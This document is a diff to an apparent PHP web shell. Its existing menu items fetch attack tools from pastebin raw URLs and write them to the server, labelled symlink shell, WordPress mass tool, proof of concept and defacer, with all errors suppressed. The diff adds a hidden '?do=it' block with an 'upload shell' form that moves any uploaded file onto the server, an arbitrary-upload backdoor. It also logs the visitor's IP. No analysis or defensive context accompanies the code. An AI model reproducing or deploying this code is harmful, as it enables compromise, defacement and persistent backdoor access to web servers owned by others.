@@ -128,7 +128,8 @@ echo "<code><a href='xsym.php'>SYM-SHELL </a><code>";
 } else {
     echo "<code><a href='?im=xfarianxxx'>SYM-SHELL </a></code>";
 }
-
+?>
+<?php
 error_reporting(0);
 if ($_GET['im']=='mass') {
 $xfarian=file_get_contents('https://pastebin.com/raw/zkCGrg4n');
@@ -137,7 +138,8 @@ echo "<a href='mass.php'>WP-MASS </a>";
 } else {
     echo "<a href='?im=mass'>WP-MASS </a>";
 }
-
+?>
+<?php
 error_reporting(0);
 if ($_GET['its']=='poc') {
 $xfarian=file_get_contents('https://pastebin.com/raw/5AgiZxER');
@@ -146,6 +148,8 @@ echo "<code><a href='poc.txt'>TXT-POC </a><code>";
 } else {
     echo "<code><a href='?its=poc'>TXT-POC </a></code>";
 }
+?>
+<?php
 error_reporting(0);
 if ($_GET['im']=='xfarianx') {
 $xfarian=file_get_contents('https://pastebin.com/raw/KWxhPrAG');
@@ -154,7 +158,18 @@ echo "<code><a href='xbug.php'>DEFAGE </a><code>";
 } else {
     echo "<code><a href='?im=xfarianx'>DEFAGE </a></code>";
 }
+?>
 
+<?php
+$do  = $_GET['do'];
+if($do== 'it'){
+$doshell = $_FILES['file']['name'];
+$doit  = $_FILES['file']['tmp_name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+ <input type='file'name='file' />
+ <input type='submit' value='upload shell' />
+</form>";
+move_uploaded_file($doit,$doshell);
 }
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
